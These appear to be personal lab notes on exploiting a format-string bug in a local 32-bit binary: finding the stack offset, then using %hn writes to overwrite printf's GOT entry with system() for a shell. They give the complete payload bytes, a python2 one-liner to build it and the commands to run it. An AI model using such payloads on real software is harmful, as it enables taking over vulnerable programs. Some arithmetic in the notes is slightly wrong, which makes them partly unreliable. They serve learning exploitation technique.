can see stack canary in ghidra
canary is present and needs to be same before and after execution, it is checked at then end of execution before the function returns a value, and if it is not same, program exited coz stack smashing detected , canary is initialized to a random value everytime a program is ran and we can also leak it 

got.plt : global offset table procedure linkage table 

printf() is being called again and again in vuln() function, so we can rewrite the address of printf() with the address of system() and pass "/bin/sh" as parameter to get a shell

Run the program and type
AAAA%7$p  :  AAAA0xffee2c80
AAAA%6$p  :  AAAA0xf7fa000a
AAAA%5$p  :  AAAA0x70243525
AAAA%4$p  :  AAAA0x41414141

We get correct output here
Basically, the characters we enter, at what place in stack they get put on

%n to write to stack 
%n will basically wirte the size of our input at the address pointed by %n, for example AAAA%n means we will write the value 4(because sizeof'AAAA' =4) at the address pointed by %n. But where on stack %n points to?
example if we want to write 0xcafebabe at some address we would need to write 3405691582 'A' 3405691582 times(0xcafebabe in decimal) which is impossible.

to  write 100 at 0x41414141 we can do AAAA%96x%$4(we got $4 from before) this will write 100 at 0x41414141 because we already wrote 4 bytes 'AAAA' and will pad other 96 will be padded with space. Also the entire number 3405691582 will take a lot of time to write so  what we can do is write 2 byte integers
So if we want to write 0xcafebabe we can do is 

1) 0xcafe(51966 in decimal) in higher orderbytes and 0xbabe (47806 in decimal) in low order bytes 

This makes it so we write 2 smaller values rather than 1 really large value.
If we want to write it at address 0xbffff6ac then we will wirte 0xcafe at 0xbffff6ac at 0xbffff6ac+2=0xbffff6ae(higher order) and 0xbabe at 0xbffff6ac (lower order)

The value we want - the bytes we already wrote = the value to set .

For lower order : 47806 - 8 =47798(since we already wrtoe 2 4 byte addresses)
For higher byte : 51966 - 47806 = 4160 (becuase we already wrote 47806 bytes, the 2, 4 bytes address and 47798 bytes of previous writing)

0xbffff6ac in little endian = \xac\xf6\xff\xbf for lower order 
and  0xbffff6ae = \xae\xf6\xff\xbf for higher order

exploit is \xac\xf6\xff\xbf\xae\xf6\xff\xbf%47798x%4$hn%4160x%5$hn
%hn to write 2 byte ints 
%47798x will write 47798 bytes on stdoutput 
%4$hn will wirte 8+47798 =47806 bytes(or 0xbabe) at first address specified(0xbffff6ac)
%4160x will write 4160 bytes on std output
%5$hn will write 8+47798+4160 = 51906 (or 0xcafe) at secind address specified 0xbffff6ae

# Need to overwrite 0x0804c00c (GOT.printf from got.plt) with 0xF7C4C880 (LIBC.system)
# It means writing 0xf7c4 (63428) @ 0x0804c00c + 2 = 0x0804c00e (high order)
# and 0xc880 (51328) @ 0x0804c00c (low order)

# Now, we have to figure out the value to set for the padding. Here is the formula :
[The value we want] - [The bytes alredy wrote] = [The value to set].

# Let’s start with the low order bytes :
It’ll will be 51328 - 8 = 51320, because we already wrote 8 bytes (the two 4 bytes addresses).

# Then, the high order bytes :
It’ll will be 63428 - 51328 = 12100

# Now we can construct the exploit (note our write offset is %4 so we want [%4,%5] as offsets instead of [%7,%8]) :

It’ll be : \x0c\xc0\x04\x08\x0e\xc0\x04\x08%51320x%4$hn%12100x%5$hn. Let me explain :
    \x0c\xc0\x04\x08 or 0x0804c00c (in reverse order) points to the low order bytes.
    \x0e\xc0\x04\x08 or 0x0804c00e (in reverse order) points to the high order bytes.
    %51320x will write 51320 bytes on the standard output.
    %4$hn will write 8 + 51320 = 51328 bytes (or 0xc880) at the first address specified (0x0804c00c).
    %12100x will write 12100 bytes on the standard output.
    %5$hn will write 8 + 51320 + 12100 = 63428 (or 0xf7c4) at the second address specified (0x0804c00e).

python2 -c 'print("\x0c\xc0\x04\x08\x0e\xc0\x04\x08%51320x%4$hn%12100x%5$hn")' > payload

ldd got_overwrite (gives base of libx)
readelf -s /lib/i386-linux-gnu/libc.so.6 -a  | grep system(gives offset of system)


(cat payload; cat) | ./got_verwrite
